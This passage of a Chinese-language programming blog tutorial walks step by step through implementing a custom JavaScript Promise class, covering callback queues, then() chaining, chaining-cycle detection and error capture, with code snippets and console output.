class="string">&#x27;resolve&#x27;</span>, value)</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">promise.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;resolve&#x27;</span>, value)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">promise.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">3</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;resolve&#x27;</span>, value)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>目前的代码只能输出：<code>3 resolve success</code></p><h4 id="MyPromise-类中新增两个数组"><a href="#MyPromise-类中新增两个数组" class="headerlink" title="MyPromise 类中新增两个数组"></a>MyPromise 类中新增两个数组</h4><p>这里实际是用数组模拟了两个队列</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存储成功回调函数</span></span><br><span class="line"><span class="comment">// onFulfilledCallback = null;</span></span><br><span class="line">onFulfilledCallbacks = [];</span><br><span class="line"><span class="comment">// 存储失败回调函数</span></span><br><span class="line"><span class="comment">// onRejectedCallback = null;</span></span><br><span class="line">onRejectedCallbacks = [];</span><br></pre></td></tr></table></figure><h4 id="回调函数存入数组中"><a href="#回调函数存入数组中" class="headerlink" title="回调函数存入数组中"></a>回调函数存入数组中</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">then</span>(<span class="params">onFulfilled, onRejected</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 判断状态</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.status === FULFILLED) &#123;</span><br><span class="line">        <span class="comment">// 调用成功回调，并且把值返回</span></span><br><span class="line">        onFulfilled(<span class="built_in">this</span>.value);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.status === REJECTED) &#123;</span><br><span class="line">        <span class="comment">// 调用失败回调，并且把原因返回</span></span><br><span class="line">        onRejected(<span class="built_in">this</span>.reason);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.status === PENDING) &#123;</span><br><span class="line">        <span class="comment">// 因为不知道后面状态的变化情况，所以将成功回调和失败回调存储起来</span></span><br><span class="line">        <span class="comment">// 等到执行成功失败函数的时候再传递</span></span><br><span class="line">        <span class="built_in">this</span>.onFulfilledCallback.push(onFulfilled);</span><br><span class="line">        <span class="built_in">this</span>.onRejectedCallback.push(onRejected);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="循环调用成功和失败回调"><a href="#循环调用成功和失败回调" class="headerlink" title="循环调用成功和失败回调"></a>循环调用成功和失败回调</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 更改成功后的状态</span></span><br><span class="line"><span class="keyword">const</span> resolve = <span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 只有状态是等待，才执行状态修改</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.status === PENDING) &#123;</span><br><span class="line">        <span class="built_in">this</span>.status = FULFILLED;<span class="comment">// 状态修改为成功</span></span><br><span class="line">        <span class="built_in">this</span>.value = value;<span class="comment">// 保存成功之后的值</span></span><br><span class="line">        <span class="comment">// resolve里面将所有成功的回调拿出来执行</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">this</span>.onFulfilledCallbacks.length) &#123;</span><br><span class="line">            <span class="comment">// Array.shift() 取出数组第一个元素，然后（）调用，shift不是纯函数，取出后，数组将失去该元素，直到数组为空</span></span><br><span class="line">            <span class="built_in">this</span>.onFulfilledCallbacks.shift()(value)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 更改失败后的状态</span></span><br><span class="line"><span class="keyword">const</span> reject = <span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 只有状态是等待，才执行状态修改</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.status === PENDING) &#123;</span><br><span class="line">        <span class="built_in">this</span>.status = REJECTED;<span class="comment">// 状态修改为成功</span></span><br><span class="line">        <span class="built_in">this</span>.reason = reason;<span class="comment">// 保存失败后的原因</span></span><br><span class="line">        <span class="comment">// reject里面将所有失败的回调拿出来执行</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">this</span>.onRejectedCallback.length)&#123;</span><br><span class="line">            <span class="built_in">this</span>.onRejectedCallback.shift()(reason);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来运行一下，看看结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">resolve success</span><br><span class="line"><span class="number">2</span></span><br><span class="line">resolve success</span><br><span class="line"><span class="number">3</span></span><br><span class="line">resolve success</span><br></pre></td></tr></table></figure><h3 id="实现-then-方法的链式调用"><a href="#实现-then-方法的链式调用" class="headerlink" title="实现 then 方法的链式调用"></a>实现 then 方法的链式调用</h3><blockquote><p>then 方法要链式调用那么就需要返回一个 Promise 对象。<br>then 方法里面 return 一个返回值作为下一个 then 方法的参数，如果是 return 一个 Promise 对象，那么就需要判断它的状态。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> MyPromise <span class="keyword">from</span> <span class="string">&quot;./MyPromise.js&quot;</span></span><br><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 目前这里只处理同步的问题</span></span><br><span class="line">  resolve(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">other</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span>&#123;</span><br><span class="line">    resolve(<span class="string">&#x27;other&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">promise.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">1</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;resolve&#x27;</span>, value)</span><br><span class="line">  <span class="keyword">return</span> other()</span><br><span class="line">&#125;).then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;resolve&#x27;</span>, value)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之前的手写代码运行的时候会报错</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">then</span>(<span class="params">onFulfilled, onRejected</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 为了链式调用这里直接创建一个MyPromise，并在后面return出去</span></span><br><span class="line">    <span class="comment">// promise有暂时性死区，初始化之后才能使用</span></span><br><span class="line">    <span class="keyword">const</span> promise = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 这里的内容在执行器中，会立即执行</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.status === FULFILLED) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取成功回调函数的执行结果</span></span><br><span class="line">            <span class="keyword">const</span> result = onFulfilled(<span class="built_in">this</span>.value);</span><br><span class="line">            <span class="comment">// 传入 resolvePromise 集中处理</span></span><br><span class="line">            resolvePromise(result, resolve, reject);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.status === REJECTED) &#123;</span><br><span class="line">            <span class="comment">// 调用失败回调，并且把原因返回</span></span><br><span class="line">            onRejected(<span class="built_in">this</span>.reason);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.status === PENDING) &#123;</span><br><span class="line">            <span class="comment">// 因为不知道后面状态的变化情况，所以将成功回调和失败回调存储起来</span></span><br><span class="line">            <span class="comment">// 等到执行成功失败函数的时候再传递</span></span><br><span class="line">            <span class="built_in">this</span>.onFulfilledCallbacks.push(onFulfilled);</span><br><span class="line">            <span class="built_in">this</span>.onRejectedCallbacks.push(onRejected);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 封装一个函数统一处理回调函数的执行结果 </span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">resolvePromise</span>(<span class="params">result, resolve, reject</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 判断result是不是 MyPromise 实例对象</span></span><br><span class="line">            <span class="keyword">if</span> (result <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">                <span class="comment">// 执行 result，调用 then 方法，目的是将其状态变为 fulfilled 或者 rejected</span></span><br><span class="line">                <span class="comment">// result.then(value =&gt; resolve(value), reason =&gt; reject(reason))</span></span><br><span class="line">                <span class="comment">// 简化之后</span></span><br><span class="line">                result.then(resolve, reject);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 普通值</span></span><br><span class="line">                resolve(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> promise;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行一下，结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">resolve success</span><br><span class="line"><span class="number">2</span></span><br><span class="line">resolve other</span><br></pre></td></tr></table></figure><h3 id="then-方法链式调用识别-Promise-是否返回自己"><a href="#then-方法链式调用识别-Promise-是否返回自己" class="headerlink" title="then 方法链式调用识别 Promise 是否返回自己"></a>then 方法链式调用识别 Promise 是否返回自己</h3><blockquote><p>如果 then 方法返回的是自己的 Promise 对象，则会发生循环调用，这个时候程序会报错</p></blockquote><p>例如下面这种情况</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="number">100</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">const</span> p1 = promise.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value)</span><br><span class="line">  <span class="keyword">return</span> p1</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>使用原生 Promise 执行这个代码，会报类型错误</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">100</span></span><br><span class="line">Uncaught (<span class="keyword">in</span> promise) <span class="built_in">TypeError</span>: Chaining cycle detected <span class="keyword">for</span> promise #&lt;<span class="built_in">Promise</span>&gt;</span><br></pre></td></tr></table></figure><p>修改代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">then</span>(<span class="params">onFulfilled, onRejected</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 为了链式调用这里直接创建一个MyPromise，并在后面return出去</span></span><br><span class="line">    <span class="comment">// promise有暂时性死区，初始化之后才能使用</span></span><br><span class="line">    <span class="keyword">const</span> promise = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 这里的内容在执行器中，会立即执行</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.status === FULFILLED) &#123;</span><br><span class="line">            <span class="comment">// 创建一个微任务等待 promise 完成初始化</span></span><br><span class="line">            queueMicrotask(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">// 获取成功回调函数的执行结果</span></span><br><span class="line">                <span class="keyword">const</span> result = onFulfilled(<span class="built_in">this</span>.value);</span><br><span class="line">                <span class="comment">// 传入 resolvePromise 集中处理</span></span><br><span class="line">                resolvePromise(promise, result, resolve, reject);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.status === REJECTED) &#123;</span><br><span class="line">            <span class="comment">// 调用失败回调，并且把原因返回</span></span><br><span class="line">            onRejected(<span class="built_in">this</span>.reason);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.status === PENDING) &#123;</span><br><span class="line">            <span class="comment">// 因为不知道后面状态的变化情况，所以将成功回调和失败回调存储起来</span></span><br><span class="line">            <span class="comment">// 等到执行成功失败函数的时候再传递</span></span><br><span class="line">            <span class="built_in">this</span>.onFulfilledCallbacks.push(onFulfilled);</span><br><span class="line">            <span class="built_in">this</span>.onRejectedCallbacks.push(onRejected);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 封装一个函数统一处理回调函数的执行结果 </span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">resolvePromise</span>(<span class="params">promise, result, resolve, reject</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 如果相等了，说明return的是自己，抛出类型错误并返回</span></span><br><span class="line">            <span class="keyword">if</span> (promise === result) &#123;</span><br><span class="line">                <span class="keyword">return</span> reject(<span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&#x27;Chaining cycle detected for promise #&lt;Promise&gt;&#x27;</span>))</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 判断result是不是 MyPromise 实例对象</span></span><br><span class="line">            <span class="keyword">if</span> (result <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">                <span class="comment">// 执行 result，调用 then 方法，目的是将其状态变为 fulfilled 或者 rejected</span></span><br><span class="line">                <span class="comment">// result.then(value =&gt; resolve(value), reason =&gt; reject(reason))</span></span><br><span class="line">                <span class="comment">// 简化之后</span></span><br><span class="line">                result.then(resolve, reject);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 普通值</span></span><br><span class="line">                resolve(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> promise;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    resolve(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 这个时候将promise定义一个p1，然后返回的时候返回p1这个promise</span></span><br><span class="line"><span class="keyword">const</span> p1 = promise.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="number">1</span>)</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">&#x27;resolve&#x27;</span>, value)</span><br><span class="line">   <span class="keyword">return</span> p1</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 运行的时候会走reject</span></span><br><span class="line">p1.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;resolve&#x27;</span>, value)</span><br><span class="line">&#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">3</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(reason.message)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里得到我们的结果 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">resolve success</span><br><span class="line"><span class="number">3</span></span><br><span class="line">Chaining cycle detected <span class="keyword">for</span> promise #&lt;<span class="built_in">Promise</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="捕获错误及-then-链式调用其他状态代码补充"><a href="#捕获错误及-then-链式调用其他状态代码补充" class="headerlink" title="捕获错误及 then 链式调用其他状态代码补充"></a>捕获错误及 then 链式调用其他状态代码补充</h3><h4 id="捕获执行器错误"><a href="#捕获执行器错误" class="headerlink" title="捕获执行器错误"></a>捕获执行器错误</h4><blockquote><p>捕获执行器中的代码，如果执行器中有代码错误，那么 Promise 的状态要变为失败</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">constructor</span>(<span class="params">executor</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// executor 是一个执行器，进入会立即执行</span></span><br><span class="line">    <span class="comment">// 并传入resolve和reject方法</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        executor(<span class="built_in">this</span>.resolve, <span class="built_in">this</span>.reject);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="comment">// 如果有错误，就直接执行reject</span></span><br><span class="line">        <span class="built_in">this</span>.reject(error)</span><br><span class="line">    &#125;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>验证一下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// resolve(&#x27;success&#x27;)</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;执行器错误&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">promise.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">1</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;resolve&#x27;</span>, value)</span><br><span class="line">&#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(reason.message)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>执行结果 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span></span><br><span class="line">执行器错误</span><br></pre></td></tr></table></figure><h4 id="then-执行的时错误捕获"><a href="#then-执行的时错误捕获" class="headerlink" title="then 执行的时错误捕获"></a>then 执行的时错误捕获</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">then</span>(<span class="params">onFulfilled, onRejected</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 为了链式调用这里直接创建一个MyPromise，并在后面return出去</span></span><br><span class="line">    <span class="comment">// promise有暂时性死区，初始化之后才能使用</span></span><br><span class="line">    <span class="keyword">const</span> promise = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 这里的内容在执行器中，会立即执行</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.status === FULFILLED) &#123;</span><br><span class="line">            <span class="comment">// 创建一个微任务等待 promise 完成初始化</span></span><br><span class="line">            queueMicrotask(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 获取成功回调函数的执行结果</span></span><br><span class="line">                    <span class="keyword">const</span> result = onFulfilled(<span class="built_in">this</span>.value);</span><br><span class="line">                    <span class="comment">// 传入 resolvePromise 集中处理</span></span><br><span class="line">                    resolvePromise(promise, result, resolve, reject);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    reject(error)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.status === REJECTED) &#123;</span><br><span class="line">            <span class="comment">// 调用失败回调，并且把原因返回</span></span><br><span class="line">            onRejected(<span class="built_in">this</span>.reason);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.status === PENDING) &#123;</span><br><span class="line">            <span class="comment">// 因为不知道后面状态的变化情况，所以将成功回调和失败回调存储起来</span></span><br><span class="line">            <span class="comment">// 等到执行成功失败函数的时候再传递</span></span><br><span class="line">            <span class="built_in">this</span>.onFulfilledCallbacks.push(onFulfilled);</span><br><span class="line">            <span class="built_in">this</span>.onRejectedCallbacks.push(onRejected);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 封装一个函数统一处理回调函数的执行结果 </span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">resolvePromise</span>(<span class="params">promise, result, resolve, reject</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 如果相等了，说明return的是自己，抛出类型错误并返回</span></span><br><span class="line">            <span class="keyword">if</span> (promise === result) &#123;</span><br><span class="line">                <span class="keyword">return</span> reject(<span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&#x27;Chaining cycle detected for promise #&lt;Promise&gt;&#x27;</span>))</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 判断result是不是 MyPromise 实例对象</span></span><br><span class="line">            <span class="keyword">if</span> (result <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">                <span class="comment">// 执行 result，调用 then 方法，目的是将其状态变为 fulfilled 或者 rejected</span></span><br><span class="line">                <span class="comment">// result.then(value =&gt; resolve(value), reason =&gt; reject(reason))</span></span><br><span class="line">                <span class="comment">// 简化之后</span></span><br><span class="line">                result.then(resolve, reject);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 普通值</span></span><br><span class="line">                resolve(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> promise;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>验证一下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 